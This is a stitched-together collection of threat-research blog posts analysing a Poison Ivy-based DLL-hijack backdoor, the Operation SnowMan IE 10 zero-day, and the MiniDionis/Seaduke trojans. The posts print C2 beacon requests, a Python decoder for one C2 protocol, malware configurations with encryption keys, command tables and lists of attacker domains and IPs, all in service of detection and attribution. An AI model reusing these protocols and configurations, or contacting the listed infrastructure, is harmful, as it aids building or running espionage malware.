On reboot explorer.exe was now happy to load the backdoor and get down to business ; this technique is known as dll search order hijacking or binary planting .
Interestingly the backdoor will also load the legitimate system32\msacm32.drv file resolve functions and pass calls to it so it does n't break audio playback on the victim system .
The backdoor contains identical exports as well as an additional dummy function from the legitimate msacm32.drvcalled `` StartWork '' which can be used to reliably identify similar samples .
The backdoor routine exists inside the DllMain function so when explorer.exeloads the backdoor via LoadLibrary it will begin spawning malicious threads .
A PDB path was also left in this binary C : \Users\cmd\Desktop\msacm32\Release\msacm32.pdb ; A quick google search will lead you to a YARA rule written by Patrick Olsen and the very similar sample 869fa4dfdbabfabe87d334f85ddda234 which communicates to www.micro1.zyns.com on TCP port 80 .
The two files also have an identical compilation time , which suggests the backdoor is probably not recompiled very often and instead the attacker simply updates the callback configuration information .
The backdoor interestingly contains the well known Poison Ivy RAT shellcode as well as its own custom backdoor .
It will first attempt to communicate to fighthard.mooo.com using the poison ivy binary protocol with the default connection password of `` admin '' .
The Poison Ivy shellcode is encrypted using a custom cipher with the key `` Tiger324 { `` beginning at offset 0xFA5 and ending at 0x159E .
If this initial connection fails it will revert to the secondary backdoor , which utilizes HTTP GET and POST requests somewhat similar to the ones described above to the internal IP address `` 192.168.2.26 '' .
This suggested the attacker had already compromised other systems in the environment and was using an internal C2 mechanism for a fallback .
Example Internal Beacon : GET /login.asp ? p * hWe8J5pF * k5xv5XeUhIJbKZQfySZRv1NcwhQi2ZHKKvGBC8EjiadbWLoUcgUxJyZElD7AY0DCWmzbIa9IX EJ7OZkvwBZVx1JsrhQ== HTTP/1.1 User-Agent : Mozilla/4.0 ( compatible ; MSIE 8.0 ; Win32 ) Host : 192.168.2.26 Requests may also be made to the following pages : `` check.asp '' , `` result.asp '' , and `` upload.asp '' .
The request structure is slightly different in that it uses the base64 alphabet `` ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+ * '' .
The resulting request can be decoded further by using the first 16 bytes of the result as an XOR key to decode the rest of the payload .
It also uses a static User-Agent string of `` Mozilla/4.0 ( compatible ; MSIE 8.0 ; Win32 ) '' for each request .
The following script simplifies this process :
def rolling_xor ( buf , key ) : out = '' k = 0 for i in buf : if k == len ( key ) : k = 0 out += chr ( ord ( i ) ^ ord ( key [ k ] ) ) k += 1 return out req = ' p * hWe8J5pF * k5xv5XeUhIJbKZQfySZRv1NcwhQi2ZHKKvGBC8EjiadbWLoUcgUxJyZElD7AY0DCWmzbIa9I XEJ7OZkvwBZVx1JsrhQ== ' unb64 = base64.b64decode ( req , '+ * ' ) dec = rolling_xor ( unb64 [ 16 : : ] , unb64 [ 0:16 ] ) print dec .
The request decodes to `` 123|000000+|USER-D6921F6215|Administrator|-1676096002|1.0|0| '' , where values are separated by the delimiter `` | '' .
`` 123 '' is a campaign identifier hard coded into the backdoor .
I do n't know what `` 000000+ '' is but it 's also a hard coded value ; my best guess is it 's to modify the timezone of the timestamp .
`` USER-D6921F6215 '' is the hostname of the victim , `` Administrator '' is the victim user , `` 1676096002 '' is the current Date/Time in decimal , and `` 1.0 '' is a version number also stored in the backdoor.The 16-byte XOR key will be randomly generated per each request .
Results from commands will be sent back encoded to the server to the `` result.asp '' page .
The backdoor will accept the following commands :
# runhfcore starts the main PI backdoor functionality in a separate thread # getdrivelist ? enumerates logical drives on the system # getfilelist ? enumerates logical files using FindFirst FindNext technique # delfile deletes a file using the DeleteFileA API # newupload ? uploads a file # newdownload ? downloads a file # runfile executes a file on the system via CreateProcess API # urldownload ? will download a file from a remote URL using InternetOpen and InternetReadFile # sleep ? Sleeps for a specified number of minutes # delay ? exact functionality unknown appears to force another request to the C2 page check.asp # maxblock ? exact functionality unknown appears to force another request to the C2 page check.asp # stop ! exact functionality unknown appears to force another request to the C2 page check.asp .
Commands with a ? appear to take an additional parameter while files that end in require a full file path .
The backdoor is also capable of elevating its privileges on win7 and above using a method similar to the one described here : http : //www.pretentiousname.com/misc/win7_uac_whitelist2.html .
I thought it was interesting the backdoor used a secondary backup backdoor in addition to its primary payload .
The first communicated directly outside the network using a well known RAT protocol and if that failed the secondary much stealthier backdoor communicated to an internal C2 address using it 's own custom encoded HTTP based protocol .
The use of a relatively undisclosed DLL search order hijack also made this sample unique .
Detection rates for this binary seem to be pretty good right now 39/57 ; however , at the time it was first used in late January 2014 detection rates were much poorer .
Other samples from the identified exploit documents were similar to the one described above with different network callbacks .
And now to tie all this back to the `` well-known '' threat group .
The `` 173.224.214.12 `` IP address that `` fighthard.mooo.com `` previously resolved to also historically had two other domains point to it `` queenberry.www1.biz `` and `` word.crabdance.com `` .
`` word.crabdance.com `` previously resolved to `` 64.71.162.70 `` on September 8 , 2012 and 108.171.246.140 on February 19 , 2014 .
The `` 64.71.162.70 `` address and the associated domain `` www.ollay011.zyns.com `` are rather infamous and the first mention of it I could find is in this shadowserver post : http : //blog.shadowserver.org/2012/04/16/beware-of-what-you download-recent-purported-ceiec-document-dump-booby-trapped/ related to exploit documents identified in a data dump from Hardcore Charlie .
If you follow the rabbit hole deep enough you can eventually trace samples via domain and IP address crossover back to the FBI flash # A-000009-MW from mid 2013 .
Additional domains and IP addresses related to this group are included in the appendix .
Mitigation .
While defending against the constant stream of new malware from advanced threat groups may be difficult , organizations can take some relatively easy steps to help identify intrusions .
This group is among the numerous threat actors who rely almost exclusively on Dynamic DNS infrastructure .
They seem to prefer ChangeIP ( https : //www.changeip.com/services/free-dynamic-dns/ ( https : //www.changeip.com/services/free dynamic-dns/ ) ) and Afraid ( https : //freedns.afraid.org/ ( https : //freedns.afraid.org/ ) ) for free DNS services , although they previously heavily used Sitelutions ( https : //sitelutions.com/info/sldns ( https : //sitelutions.com/info/sldns ) ) .
While there are some legitimate instances of dynamic DNS in corporate environments , it only accounts for a small percentage of traffic .
Monitoring and/or blocking dynamic DNS requests should help detect attacks by this actor .
Any dynamic DNS domains that resolve to non-routable IP addresses , like 127.0.0.1 or private IP addresses , should be thoroughly investigated .
The HTTP traffic generated by both samples uses a limited number of header fields , which is substantially different from the majority of traffic generated by modern browsers .
As always , do n't open E-mail attachments from untrusted parties .
APPENDIX A : Associated IP Addresses and Domains .
103.229.125.157 microsoftservices.proxydns.com current rampage.freetcp.com current fighthard.mooo.com 9/8/2014 103.238.227.69 www.micro.zyns.com current computer001.dumb1.com current microlab.dns04.com current 173.224.214.12 word.crabdance.com 11/12/2012 fighhard.mooo.com 1/31/2014 queenberry.www1.biz 2/14/2014 162.251.122.216 fighthard.mooo.com 5/20/2014 121.127.249.97 queenberry.www1.biz 10/1/2014 anhtuan88.ns01.biz anhphuong85.www1.biz 64.71.162.70 word.crabdance.com 9/8/2012 www.fornobody.dns04.com ftp.fornobody.dns04.com fornobody.dns04.com 199.192.153.72 fornobody.dns04.com 9/2/2011 www.qwertyui.dns04.com 2/24/2012 64.71.138.240 www.qwertyui.dns04.com 3/3/2012 beyondbuck.dns1.us letitsnowsmart.instanthq.com prime98.jumpingcrab.com fuck.ruouvangnhatrang.com 59.188.250.161 www.micro1.zyns.com 118.99.13.184 www.micro.zyns.com www.micro1.zyns.com 180.210.204.157 www.qwertyui.dns04.com 3/2/2011 www.ollay011.zyns.com 3/4/2011 www.olay033.dns04.com 3/12/2011 www.olay044.dns04.com 4/30/2011 9999992009.rr.nu 9999992011.rr.nu 9999992009.myfw.us 64.62.202.82 www.qwertyui.dns04.com 3/4/2012 microlab.mrslove.com 203.80.238.183 www.qwertyui.dns04.com 10/8/2010 www.olay033.dns04.com 10/4/2010 webhosts.sytes.net .
APPENDIX B : Phishing Emails Associated with the Campaign .
Tags : CylanceSPEAR ( http : //blog.cylance.com/topic/cylancespear ) « Back to Blog ( http : //blog.cylance.com ) .
Operation SnowMan : DeputyDog Actor Compromises US Veterans of Foreign Wars Website .
On February 11 , FireEye identified a zero-day exploit ( CVE-2014-0322 ) being served up from the U.S .
Veterans of Foreign Wars ’ website ( vfw.org ) .
We believe the attack is a strategic Web compromise targeting American military personnel amid a paralyzing snowstorm at the U.S .
Capitol in the days leading up to the Presidents Day holiday weekend .
Based on infrastructure overlaps and tradecraft similarities , we believe the actors behind this campaign are associated with two previously identified campaigns ( Operation DeputyDog and Operation Ephemeral Hydra ) .
This blog post examines the vulnerability and associated attacks , which we have dubbed “ Operation SnowMan . ” .
Exploit/Delivery analysis .
After compromising the VFW website , the attackers added an iframe into the beginning of the website ’ s HTML code that loads the attacker ’ s page in the background .
The attacker ’ s HTML/JavaScript page runs a Flash object , which orchestrates the remainder of the exploit .
The exploit includes calling back to the IE 10 vulnerability trigger , which is embedded in the JavaScript .
Specifically , visitors to the VFW website were silently redirected through an iframe to the exploit at www.[REDACTED].com/Data/img/img.html .
Mitigation .
The exploit targets IE 10 with Adobe Flash .
It aborts exploitation if the user is browsing with a different version of IE or has installed Microsoft ’ s Experience Mitigation Toolkit ( EMET ) .
So installing EMET or updating to IE 11 prevents this exploit from functioning .
Vulnerability analysis .
The vulnerability is a previously unknown use-after-free bug in Microsoft Internet Explorer 10 .
The vulnerability allows the attacker to modify one byte of memory at an arbitrary address .
The attacker uses the vulnerability to do the following :
Gain access to memory from Flash ActionScript , bypassing address space layout randomization ( ASLR ) Pivot to a return-oriented programing ( ROP ) exploit technique to bypass data execution prevention ( DEP ) .
EMET detection .
The attacker uses the Microsoft.XMLDOM ActiveX control to load a one-line XML string containing a file path to the EMET DLL .
Then the exploit code parses the error resulting from the XML load order to determine whether the load failed because the EMET DLL is not present .
The exploit proceeds only if this check determines that the EMET DLL is not present .
ASLR bypass .
Because the vulnerability allows attackers to modify memory to an arbitrary address , the attacker can use it to bypass ASLR .
For example , the attacker corrupts a Flash Vector object and then accesses the corrupted object from within Flash to access memory .
We have discussed this technique and other ASLR bypass approaches in our blog .
One minor difference between the previous approaches and this attack is the heap spray address , which was changed to 0x1a1b2000 in this exploit .
Code execution .
Once the attacker ’ s code has full memory access through the corrupted Flash Vector object , the code searches through loaded libraries gadgets by machine code .
The attacker then overwrites the vftable pointer of a flash.Media.Sound ( ) object in memory to point to the pivot and begin ROP .
After successful exploitation , the code repairs the corrupted Flash Vector and flash.Media.Sound to continue execution .
Shellcode analysis .
Subsequently , the malicious Flash code downloads a file containing the dropped malware payload .
The beginning of the file is a JPG image ; the end of the file ( offset 36321 ) is the payload , encoded with an XOR key of 0×95 .
The attacker appends the payload to the shellcode before pivoting to code control .
Then , when the shellcode is executed , the malware creates files “ sqlrenew.txt ” and “ stream.exe ” .
The tail of the image file is decoded , and written to these files .
“ sqlrenew.txt ” is then executed with the LoadLibraryA Windows API call .
ZxShell payload analysis .
As documented above , this exploit dropped an XOR ( 0×95 ) payload that executed a ZxShell backdoor ( MD5 : 8455bbb9a210ce603a1b646b0d951bce ) .
The compile date of the payload was 2014-02-11 , and the last modified date of the exploit code was also 2014-02-11 .
This suggests that this instantiation of the exploit was very recent and was deployed for this specific strategic Web compromise of the Veterans of Foreign Wars website .
A possible objective in the SnowMan attack is targeting military service members to steal military intelligence .
In addition to retirees , active military personnel use the VFW website .
It is probably no coincidence that Monday , Feb .
17 , is a U.S .
holiday , and much of the U.S .
Capitol shut down Thursday amid a severe winter storm .
The ZxShell backdoor is a widely used and publicly available tool used by multiple threat actors linked to cyber espionage operations .
This particular variant called back to a command and control server located at newss.effers.com .
This domain currently resolves to 118.99.60.142 .
The domain info.flnet.org also resolved to this IP address on 2014-02-12 .
Infrastructure analysis .
The info.flnet.org domain overlaps with icybin.flnet.org and book.flnet.org via the previous resolutions to the following IP addresses :
58.64.200.178 58.64.200.179 103.20.192.4 .
First Seen Last Seen CnC Domain IP 2013-08-31 2013-08-31 icybin.flnet.org 58.64.200.178 2013-05-02 2013-08-02 info.flnet.org 58.64.200.178 2013-08-02 2013-08-02 book.flnet.org 58.64.200.178 2013-08-10 2013-08-10 info.flnet.org 58.64.200.179 2013-07-15 2013-07-15 icybin.flnet.org 58.64.200.179 2014-01-02 2014-01-02 book.flnet.org 103.20.192.4 2013-12-03 2014-01-02 info.flnet.org 103.20.192.4 .
We previously observed Gh0stRat samples with the custom packet flag “ HTTPS ” calling back to book.flnet.org and icybin.flnet.org .
The threat actor responsible for Operation DeputyDog also used the “ HTTPS ” version of the Gh0st .
We also observed another “ HTTPS ” Gh0st variant connecting to a related command and control server at me.scieron.com .
MD5 Hash CnC Domain 758886e58f9ea2ff22b57cbbb015166e book.flnet.org 0294f9280491f85d898ebe471f0fb58e icybin.flnet.org 9d20566a327076b7152bbf9ed20292c4 me.scieron.com .
The me.scieron.com domain previously resolved to 58.64.199.22 .
The book.flnet.org domain also resolved to another IP in the same subnet 58.64.199.0/24 .
Specifically , book.flnet.org previously resolved to 58.64.199.27 .
Others domain seen resolving to this same /24 subnet were dll.freshdns.org , ali.blankchair.com , and cht.blankchair.com .
The domain dll.freshdns.org resolved to 58.64.199.25 .
Both ali.blankchair.com and cht.blankchair.com resolved to 58.64.199.22 .
First Seen Last Seen CnC Domain IP 2012-11-12 2012-11-28 me.scieron.com 58.64.199.22 2012-04-09 2012-10-24 cht.blankchair.com 58.64.199.22 2012-04-09 2012-09-18 ali.blankchair.com 58.64.199.22 2012-11-08 2012-11-25 dll.freshdns.org 58.64.199.25 2012-11-23 2012-11-27 rt.blankchair.com 58.64.199.25 2012-05-29 2012-6-28 book.flnet.org 58.64.199.27 .
A number of other related domains resolve to these IPs and other IPs also in this /24 subnet .
For the purposes of this blog , we ’ ve chosen to focus on those domains and IP that relate to the previously discussed DeputyDog and Ephemeral Hydra campaigns .
You may recall that dll.freshdns.org , ali.blankchair.com and cht.blankchair.com were all linked to both Operation DeputyDog and Operation Ephemeral Hydra .
Figure 1 illustrates the infrastructure overlaps and connections we observed between the strategic Web compromise campaign leveraging the VFW ’ s website , the DeputyDog , and the Ephemeral Hydra operations .
Figure 1 : Ties between Operation SnowMan , DeputyDog , and Ephemeral Hydra .
Links to DeputyDog and Ephemeral Hydra .
Other tradecraft similarities between the actor ( s ) responsible for this campaign and the actor ( s ) responsible for the DeputyDog/Ephemeral Hydra campaigns include :
The use of zero-day exploits to deliver a remote access Trojan ( RAT ) The use of strategic web compromise as a vector to distribute remote access Trojans The use of a simple single-byte XOR encoded ( 0×95 ) payload obfuscated with a .jpg extension The use of Gh0stRat with the “ HTTPS ” packet flag The use of related command-and-control ( CnC ) infrastructure during the similar time frames .
We observed many similarities from the exploitation side as well .
At a high level , this attack and the CVE-2013-3163 attack both leveraged a Flash file that orchestrated the exploit , and would call back into IE JavaScript to trigger an IE flaw .
The code within the Flash files from each attack are extremely similar .
They build ROP chains and shellcode the same way , both choose to corrupt a Flash Vector object , have some identical functions with common typos , and even share the same name .
Conclusion .
These actors have previously targeted a number of different industries , including :
U.S .
government entities Japanese firms Defense industrial base ( DIB ) companies Law firms Information technology ( IT ) companies Mining companies Non-governmental organizations ( NGOs ) .
The proven ability to successfully deploy a number of different private and public RATs using zero-day exploits against high-profile targets likely indicates that this actor ( s ) will continue to operate in the mid to long-term .
This entry was posted in Advanced Malware , Exploits , Targeted Attack , Threat Research , Vulnerabilities and tagged 0day , zero-day by Darien Kindlund , Dan Caselden , Xiaobo Chen , Ned Moran and Mike Scott .
Bookmark the permalink .
Tracking MiniDionis : CozyCar ’ s New Ride Is Related to Seaduke .
Executive Summary .
Unit 42 has uncovered a new campaign from the CozyDuke threat actors , aka CozyCar [ 1 ] , leveraging malware that appears to be related to the Seaduke malware described earlier this week by Symantec .
[ 2 ] This campaign , which began on July 7 , 2015 , appears to be targeted at government organizations and think-tanks located in democratic countries [ 3 ] , and utilizes compromised , legitimate websites for spear phishing and command and control activity .
Unit 42 discovered the extent of this attack using the Palo Alto Networks AutoFocus service , which allows analysts to quickly find correlations among malware samples analyzed by WildFire .
All files referenced throughout the analysis are contained in the IOC table at the end of this blog .
Malware Details .
The Initial Droppers : Decoy and Downloader .
The current CozyCar campaign includes spear phishing emails that deliver the payload from either by a link to a .zip file on a compromised website or by direct delivery as an attachment to the phish .
At the time of our analysis , the phishing link was no longer active .
When a user opens the attached file a poorly detected executable file [ VT 1/54 ] is extracted .
The initial dropper is a self-extracting archive ( SFX ) .
Upon execution , this executable file will drop two files in the % TEMP % directory : a decoy .wav file and the secondary dropper .
The CozyDuke group commonly uses legitimate media files to trick users .
In reality , while the media — a .wav file with a female voice claiming to be a reporter looking for commentary — is played , the secondary dropper executes in the background .
The secondary dropper requests a .swf file using SSL as illustrated in the HTTP traffic below .
As of this writing , the domain extranet.qualityplanning.com resolved to 64.244.34.200 .
GET /webscriptsecurity/view/4/player.swf HTTP/1.1 Accept : text/html , application/xhtml+xml , * / * Accept-Language : en_US User-Agent : Mozilla/5.0 ( compatible ; MSIE 8.0 ; Windows NT 5.1 ; Trident/4.0 ; .NET CLR 1.1.4322 ; .NET CLR 2.0.50727 ) Host : extranet.qualityplanning.com Connection : Keep-Alive GET /webscriptsecurity/view/4/player.swf HTTP/1.1 Accept : text/html , application/xhtml+xml , * / * Accept-Language : en_US User-Agent : Mozilla/5.0 ( compatible ; MSIE 8.0 ; Windows NT 5.1 ; Trident/4.0 ; .NET CLR 1.1.4322 ; .NET CLR 2.0.50727 ) Host : extranet.qualityplanning.com Connection : Keep-Alive The secondary dropper then cleans up after itself with a simple vbs script ( md5 : 0d132ee171768dc30d14590ed2dbadd1 ) that leaves only the decoy multimedia file behind .
But what did the dropper do with the .swf file ?
The Real Payload .
While the player.swf file downloaded by the second stage dropper does contain media , it is , again , a decoy .
The actual flash component of this file is roughly 16kb , leaving approximately 200kb of the file unaccounted for .
The second stage dropper contains decoding routines that decode the arbitrary binary data into an executable file .
The executable file is dropped in % appdata % /Roaming and appears to try and emulate legitimate software names : TimbuktuDaemon , SearchIndexer , RtkAudioService64 , dirmngr , o2flash , and usbrefs64 .
This file was not observed on VirusTotal until July 9 and has extremely low detection rates [ VT : 3/54 ] .
It appears that the authors of this particular iteration of the CozyCar group ’ s malware internally call it “ miniDionis ” according to pdb strings left in the binary ( c : \BastionSolution\Shells\Projects\miniDionis4\miniDionis\obj\Release\miniDionis.pdb ) .
It also appears to be an iteration on the “ forkmeimfamous ” aka Seaduke malware analyzed by Unit 42 in a previous blog [ 4 ] .
The malware stores 2 files in the % temp % directory : a configuration file and a secondary dll .
The configuration file ’ s name matches the final characters of the bot_id that is contained within as per the sample below :
{ `` bot_id '' : `` 8C9U-01MRLXW '' , `` host_scripts '' : [ `` http://www.illuminatistudios.net/mobile/viewer.php `` ] } { `` bot_id '' : `` 8C9U-01MRLXW '' , `` host_scripts '' : [ `` http://www.illuminatistudios.net/mobile/viewer.php `` ] } .
Figure 1 .
net disassembly of the primary payload shows the author ’ s name for the project , “ miniDionis ” .
Analysis of the secondary dll file ( name matches [ A-Z0-9 ] { 1 } \.tmp ) indicates that its primary function is to serve as a cleanup mechanism for the dropped binary .
This is likely an attempt to thwart forensic investigations .
Further examination of memory dumps taken following the execution of miniDionis reveals some clues into the beaconing activity exhibited .
The malware stores configuration values in memory as key : value pairs :
{ `` autoload_settings '' : { `` app_name '' : `` Wuauctl '' , `` delete_after '' : false , `` exe_name '' : `` Wuauctl.exe '' } , `` cookie_name '' : `` SSID '' , `` enable_autoload '' : false , `` first_run_delay '' : 0 , `` host_scripts '' : [ `` http://www.illuminatistudios.net/mobile/viewer.php `` ] , `` key_id '' : `` 01MRLXW '' , `` keys '' : { `` aes '' : `` PmDqw0pO4Rju5MFsqkRj7k5pV/84kXC9NdjIRgkN8gU= '' , `` aes_iv '' : `` tYa/iASKhNsyzFZjHolthw== '' } , `` user_agent '' : `` Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ; Trident/7.0 ; rv:11.0 ) like Gecko '' } 1 { 2 `` autoload_settings '' : { 3 `` app_name '' : `` Wuauctl '' , 4 `` delete_after '' : false , 5 `` exe_name '' : `` Wuauctl.exe '' 6 } , 7 `` cookie_name '' : `` SSID '' , 8 `` enable_autoload '' : false , 9 `` first_run_delay '' : 0 , 10 `` host_scripts '' : [ 11 `` http://www.illuminatistudios.net/mobile/viewer.php `` 12 ] , 13 `` key_id '' : `` 01MRLXW '' , 14 `` keys '' : { 15 `` aes '' : `` PmDqw0pO4Rju5MFsqkRj7k5pV/84kXC9NdjIRgkN8gU= '' , 16 `` aes_iv '' : `` tYa/iASKhNsyzFZjHolthw== '' 17 } , 18 `` user_agent '' : `` Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ; Trident/7.0 ; rv:11.0 ) like Gecko '' 19 } .
The configuration of miniDionis is a JSON blob with several important sections , which are described in the table below :
Key Functionality dictionary containing values which control the malware ’ s behavior autoload_settings when executing via persistence mechanisms subkey of autload_settings , defines the value to be used as the app_name malware ’ s name subkey of autload_settings , boolean value that defines whether the delete_after executable is to be deleted after exectuing subkey of autload_settings , defines the value to be used as the exe_name exectuable file ’ s name cookie_name defines the value in which cookie data will be stored enable_autoload boolean value which controls persistence first_run_delay time in seconds to delay initial beaconing after execution host_scripts dictionary containing the location of C2s key_id equivalent to the bot_id ; also used to derive values in C2 comms keys dictionary containing an AES key and AES IV aes aes value aes_iv aes_iv HTTP User-Agent header to be used when communicating with a user_agent C2 .
Table 1 .
‘ miniDionis ’ configuration keys .
Network Communications .
The functional payload of this Trojan starts by creating a Mutex by splitting the “ bot_id ” value in the configuration on the hyphen ( “ - “ ) and using the second portion of the split string ( specifically , “ 01MRLXW ” in the case of this configuration ) .
From a functionality standpoint , the Trojan uses the concept of tasks that are processed and completed using a pool of threads .
To obtain tasks , the Trojan will issue an HTTPS request to the C2 server ( “ host_scripts ” in the configuration ) that resembles the following example beacon : GET /mobile/viewer.php HTTP/1.1 Accept : * / * Accept-Language : en-US User-Agent : Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ; Trident/7.0 ; rv:11.0 ) like Gecko Host : www.illuminatistudios.net Cookie : SSID=sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8-25A Accept-Encoding : gzip , deflate Connection : Keep-Alive GET /mobile/viewer.php HTTP/1.1 Accept : * / * Accept-Language : en-US User-Agent : Mozilla/5.0 ( Windows NT 6.1 ; WOW64 ; Trident/7.0 ; rv:11.0 ) like Gecko Host : www.illuminatistudios.net Cookie : SSID=sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8-25A Accept-Encoding : gzip , deflate Connection : Keep-Alive The Trojan manually creates the cookie in this HTTP request .
The cookie contains ciphertext that the Trojan creates based on the “ bot_id ” in the JSON configuration .
The Trojan compresses the “ bot_id ” string using zlib and then encrypts it using the RC4 algorithm using a generated key .
The generated key is a SHA1 hash of two randomly created strings : the first of which is between 2 and 8 bytes long and the second is between 1 and 7 characters in length .
The ciphertext of the “ bot_id ” is then based64 encoded and finally the appended to the “ cookie_name ” ( “ SSID= ” ) in the configuration and sent within the HTTP request to the C2 server .
Unit 42 did not observe the first random string ( between 2 and 8 characters in length ) sent to the C2 in the first beacon , which would be required by the C2 to reproduce the exact SHA1 hash used as a key to generate the ciphertext in the cookie .
Upon further examination we believe that the C2 will not be able to decrypt the cookie in the first beacon .
Instead , the C2 will respond to the first beacon with data that the Trojan will use to extract a string , using a function named TrExtractKey seen in Figure 2 , to replace the first random string used to generate the SHA1 hash .
Once the C2 and Trojan have synchronized using this string , the C2 will be able to decrypt subsequent network beacons because the Trojan includes the random string between 1 and 7 characters that makes up the second half of the SHA1 hash within the cookie field before the ciphertext .
Figure 2 .
TrExtractKey Function Used by MiniDionis to Obtain String from C2 to Synchronize Keys .
The C2 communications , and several of the commands we will discuss in this blog , include a rather interesting technique to manually handle HTTP redirection , such as the HTTP 301 Moved Permanently and HTTP 302 Found status codes .
The technique used to handle these redirections involves checking for the presence of a “ Location ” field within the HTTP headers of the server response , then using regular expressions to parse the HTML within server response to find the appropriate URL .
The code contains three regular expressions to parse the HTML to locate the URL , the first of which is “ < a. * ? > . * ?
” that locates all of the tags associated with link within the HTML .
The second regular expression of “ onclick=\ ” Accept ( ) ; \ ” ” locates only links within the HTML with a specific “ onclick ” action .
The last regular expression of “ href\\s * =\\s * ( ? : [ \ ” ‘ ] ( ? < 1 > [ ^\ ” ‘ ] * ) [ \ ” ‘ ] | ( ? < 1 > \\S+ ) ) ” to obtain the correct URL to interact with as the C2 server .
Command handler .
Once the C2 and Trojan have synchronized and can decrypt their network communications the C2 server will begin responding to beacons from the Trojan with JSON blobs .
Unit 42 has not received any JSON blobs from an active C2 server , but based on static analysis of the Trojan determined the JSON would look as follows : { 'tasks ' : [ { 'task_id ' : `` `` , 'task_data ' : { 'command ' : `` `` , 'data ' : `` `` } } , ] } { 'tasks ' : [ { 'task_id ' : `` `` , 'task_data ' : { 'command ' : `` `` , 'data ' : `` `` } } , ] } The Trojan takes this JSON blob and adds each task in the list into a pool for processing .
Separate worker threads access this pool of tasks and process the commands and perform the necessary activities .
Unit 42 analyzed the Trojan ’ s command handler and found several commands , as seen in Table 2 , which allows the threat actors to carry out a full range of activities on the system .
Command Sub-Command Description Checks for subcommands within the ‘ data ’ section , if cmd not it attempts to run the ‘ data ’ using “ cmd /c .
’ cd Changes directory pwd Returns current working directory cdt Change to temporary directory : set_update_interval Sets the timeout between network beacons : proxy Configures proxy information Exits the Trojan and responds to the C2 server with : exit “ Bye ! ” : wget Downloads a file from a specified URL : uploadto Uploads a file to a specified URL exec Launches an application and waits for it to exit Launches an applications and does not wait for it to execw exit Uploads or downloads from a list of files to or from upl the C2 server Sends system information from the compromised srv system to the C2 server .
Table 2 .
Available Commands within MiniDionis ’ Command Handler .
Conclusion .
The actors behind the CozyDuke framework are highly sophisticated , motivated , and have become increasingly bold in their campaigns .
We recommend that other security practitioners review the included Indicators of Compromise ( IoCs ) to ensure they have not been targets in this campaign , and add the appropriate security controls to prevent future attacks .
This group is reliant on social engineering , and thus , user education remains of paramount importance .
Palo Alto Networks customers using WildFire were protected from this campaign .
All known elements of this campaign have been accurately identified by WildFire as malicious .
IOCs .
domain ff.whitebirchpaper.com domain visionresearch.com domain betawebservices.ntnonline.com domain staff.shasta.com hostname extranet.qualityplanning.com hostname secure.hgl.com hostname illuminatistudios.net ip 103.254.16.168 ip 103.226.132.7 ip 122.228.193.115 md5 01039a95e0a14767784acc8f07035935 md5 0f9534b63cb7af1e3aa34839d7d6e632 md5 2e64131c0426a18c1c363ec69ae6b5f2 md5 70f5574e4e7ad360f4f5c2117a7a1ca7 md5 1dd593ad084e1526c8facce834b0e124 md5 42ffc84c6381a18b1f6d000b94c74b09 md5 719cf63a3922953ceaca6fb4dbed6584 md5 f415470b9f0edc1298b1f6ae75dfaf31 md5 ca770a4c9881afcd610aad30aa53f651 md5 24083e6186bc773cd9c2e70a49309763 md5 b0a9a175e2407352214b2d005253bc0c md5 b55628a605a5dfb5005c44220ae03b8a md5 26bd36cc57e30656363ca89910579f63 md5 a9c045c401afb9766e2ca838dc6f47a4 md5 f8cb10b2ee8af6c5555e9cf3701b845f md5 c8b49b42e6ebb6b977ce7001b6bd96c8 md5 030da7510113c28ee68df8a19c643bb0 md5 e07ef8ffe965ec8b72041ddf9527cac4 md5 4cbd9a0832dcf23867b092de37c10d9d md5 3a04a5d7ed785daa16f4ebfd3acf0867 md5 9018fa0826f237342471895f315dbf39 md5 98613ecb3afde5fc48ca4204f8363f1d md5 e00bf9b8261410744c10ae3fe2ce9049 md5 51ea28f4f3fa794d5b207475897b1eef md5 3195110045f64a3c83fc3e043c46d253 md5 1dd593ad084e1526c8facce834b0e124 url connectads.com url kane-consulting.net url edadmin.kearsney.com url redbluffchamber.com .
Sources [ 1 ] https : //securelist.com/blog/research/69731/the-cozyduke-apt/ [ 2 ] http : //www.symantec.com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory [ 3 ] http : //www.theregister.co.uk/2015/04/22/cozyduke_hackers_white_house_state_dept_malware/ [ 4 ] http : //researchcenter.paloaltonetworks.com/2015/07/unit-42-technical-analysis-seaduke/ .
`` Forkmeiamfamous '' : Seaduke , latest weapon in the Duke armory .
Low-profile information-stealing Trojan is used only against high value targets .
Symantec has uncovered an elusive Trojan used by the cyberespionage group behind the â€œDukeâ€​ family of malware .
Seaduke ( detected by Symantec as Trojan.Seaduke ) is a low-profile information stealing Trojan which appears to be reserved for attacks against a small number of high-value targets .
Seaduke has been used in attacks against a number of major , government-level targets .
The malware hides behind numerous layers of encryption and obfuscation and is capable of quietly stealing and exfiltrating sensitive information such as email from the victimâ€™s computer .
Seaduke has a highly configurable framework and Symantec has already found hundreds of different configurations on compromised networks .
Its creators are likely to have spent a considerable amount of time and resources in preparing these attacks and the malware has been deployed against a number of high-level government targets .
While the Duke group began to distribute Cozyduke in an increasingly aggressive manner , Seaduke installations were reserved only for select targets .
Seaduke victims are generally first infected with Cozyduke and , if the computer appears to be a target of interest , the operators will install Seaduke .
Background .
The group behind Seaduke is a cyberespionage operation that is responsible for a series of attacks against high-profile individuals and organizations in government , international policy and private research in the United States and Europe .
It has a range of malware tools at its disposal , known as the Dukes , including Cozyduke ( Trojan.Cozer ) , Miniduke ( Backdoor.Miniduke ) and Cosmicduke ( Backdoor.Tinybaron ) .
News of the Duke group first emerged in March and April of 2015 , when reports detailing attacks involving a sophisticated threat actor variously called OfficeMonkeys , EuroAPT , CozyBear , and Cozyduke were published .
Symantec believes that this group has a history of compromising governmental and diplomatic organizations since at least 2010 .
The group began its current campaign as early as March 2014 , when Trojan.Cozer ( aka Cozyduke ) was identified on the network of a private research institute in Washington , D.C .
In the months that followed , the Duke group began to target victims with â€œOffice Monkeysâ€​ and â€œeFaxâ€​-themed emails , booby-trapped with a Cozyduke payload .
These tactics were atypical of a cyberespionage group .
Itâ€™s quite likely these themes were deliberately chosen to act as a smokescreen , hiding the true intent of the adversary .
Figure 1 .
